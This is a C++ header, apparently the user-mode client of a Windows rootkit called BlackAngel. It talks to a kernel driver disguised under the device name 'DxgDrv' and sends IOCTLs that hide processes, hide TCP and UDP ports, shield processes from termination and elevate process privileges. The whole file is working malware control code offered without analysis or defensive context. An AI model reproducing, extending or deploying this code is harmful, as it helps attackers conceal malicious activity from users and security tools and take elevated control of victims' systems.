#pragma once
#include <iostream>
#include <Windows.h>

#define IOCTL_HIDEPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666a, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_HIDEPORT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666b, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_PROTPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666c, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_ELEVPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666d, METHOD_NEITHER, FILE_SPECIAL_ACCESS)

// Set to FALSE to disable console output
#define OUTPUT TRUE


namespace BlackAngel
{
	static HANDLE DriverHandle = nullptr;

	BOOL Connect()
	{
		DriverHandle = CreateFile(L"\\\\.\\DxgDrv", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

		if (DriverHandle == INVALID_HANDLE_VALUE)
		{
#if OUTPUT
			std::cout << "[-] Couldn't open handle to the driver. Error : " << GetLastError() << std::endl;
#endif
			return FALSE;
		}

		return TRUE;
	}

	struct PidData {
		UINT32 Pid;
	};

	struct PortData {
		USHORT Port;
	};

	struct HideProtocol {
		USHORT LTCP;
		USHORT RTCP;
		USHORT UDP;
	};

	VOID HideProcess(UINT32 PID)
	{
		PidData data;
		data.Pid = PID;

		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);

		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
	}

	VOID ElevateProcess(UINT32 PID)
	{
		PidData data;
		data.Pid = PID;

		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_ELEVPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);

		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return;
		}

#if OUTPUT
		std::cout << "[!] Message sent to driver" << std::endl;
#endif
	}

	VOID ProtectProcess(UINT32 PID)
	{
		PidData data;
		data.Pid = PID;

		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_PROTPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);
		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
	}

	VOID HidePort(HideProtocol hp)
	{
		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPORT, &hp, sizeof(hp), nullptr, 0, &returned, nullptr);
		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
	}

}